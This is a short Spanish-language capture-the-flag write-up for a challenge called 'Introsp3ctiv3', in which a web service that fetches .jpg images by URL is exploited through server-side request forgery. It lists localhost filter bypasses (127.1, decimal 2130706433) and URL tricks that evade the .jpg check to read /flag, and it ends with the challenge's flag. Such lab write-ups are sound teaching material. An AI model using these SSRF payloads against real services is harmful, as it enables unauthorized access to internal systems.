# Writeup: Introsp3ctiv3

Es una servicio web vulnerable a SSRF.
La web nos pide una url para obtener una imagen .jpg, y el reto nos pide obtener /flag
Para obtenerlo tendremos que buscar cómo saltarnos el filtro de .jpg y también localhost o 127.0.0.1

En internet podemos encontrar gran variedad de payloads para lograr SSRF. Unos ejemplos serían:
```
http://127.1/          <--- Algunas librerías autocompletan los 0 intermedios, en este caso 127.0.0.1
http://127.2/          <--- Igual que el anterior pero 127.0.0.2
http://2130706433/          <--- Es 127.0.0.1 en decimal
```

Ahora podemos empezar a armar nuestro payload. Tenemos que saltarnos el filtro de que incluya .jpg
Para esto hay varias formas, por ejemplo:
`http://127.1:5002/.jpg/../flag`
`http://127.1:5002/flag?a=.jpg`

Con esto, ya tendremos la flag al inspeccionar el código HTML
```
<body>
    <div id="container">
		<h1>Esta es su imagen</h1>
		<img src="/static/dGfCvCyKdZmBaQvEwReL" alt="Su imagen">
	</div>
</body>
```
Si entramos al archivo de "su imagen", que realmente es /flag, podremos ver la flag del reto.
`ETSIIT_CTF{W00000000000000W!_Y0U_G0T_4N_SSRF}`
